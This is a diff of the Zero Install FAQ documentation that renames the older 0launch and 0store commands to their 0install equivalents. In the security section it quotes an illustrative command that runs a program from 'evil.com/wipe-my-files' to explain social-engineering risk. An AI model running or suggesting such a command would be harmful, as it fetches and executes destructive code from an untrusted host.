@@ -154,7 +154,7 @@ What about when resources move?
 
 : Also, if a feed can't be fetched from its main site, Zero Install will automatically try using a [mirror service.](../tools/0mirror.md) Mirror services continue hosting feeds that are no longer available from their original sites.
 
-: The `0install import` command lets you import the feed from the new location, and `0store` allows adding any archive to the cache (provided its message digest matches). Because Zero Install simply unpacks an archive when installing a package, anyone with that program cached can re-export it (e.g. using [0export](../tools/0export.md)). Because Zero Install digests are over the package archive's contents (not the archive itself), the original GPG signature is still valid (and is also exported by 0export). The digest can also be checked against the one from the mirror server.
+: The `0install import` command lets you import the feed from the new location, and `0install store add` allows adding any archive to the cache (provided its message digest matches). Because Zero Install simply unpacks an archive when installing a package, anyone with that program cached can re-export it (e.g. using [0export](../tools/0export.md)). Because Zero Install digests are over the package archive's contents (not the archive itself), the original GPG signature is still valid (and is also exported by 0export). The digest can also be checked against the one from the mirror server.
 
 # Security questions
 
@@ -173,7 +173,7 @@ Doesn't Zero Install make it easier to send users malicious software?
 : Not really. True, you could email a user, telling them to run:
 
 ```shell
-$ 0launch http://evil.com/wipe-my-files
+$ 0install run http://evil.com/wipe-my-files
 ```
 
 But on the other hand, you could also send them an email telling them to type:
@@ -232,10 +232,10 @@ $ ./AppRun
 *** This program needs ROX-Lib2 (version 1.19.14) to run.
 ```
 
-The required libraries are listed in the `Edit.xml` file, and you can run that using `0launch`:
+The required libraries are listed in the `Edit.xml` file, and you can run that using `0install run`:
 
 ```shell
-$ 0launch Edit.xml
+$ 0install run Edit.xml
 [ edit runs ]
 ```
 
@@ -243,7 +243,7 @@ Of course, you could do `0install add edit-git Edit.xml` to make a command that 
 
 How can I register my own version under the original's URI?
 
-: The answer to the last question showed how to run a local version of a program directly, using 0launch to fetch the libraries it needed. However, if you (or some other program) run Edit using the normal URI (`http://rox.sourceforge.net/2005/interfaces/Edit`), your version won't show up. To add it, use `0install add-feed`:
+: The answer to the last question showed how to run a local version of a program directly, using 0install to fetch the libraries it needed. However, if you (or some other program) run Edit using the normal URI (`http://rox.sourceforge.net/2005/interfaces/Edit`), your version won't show up. To add it, use `0install add-feed`:
 
 ```shell
 $ cd Edit
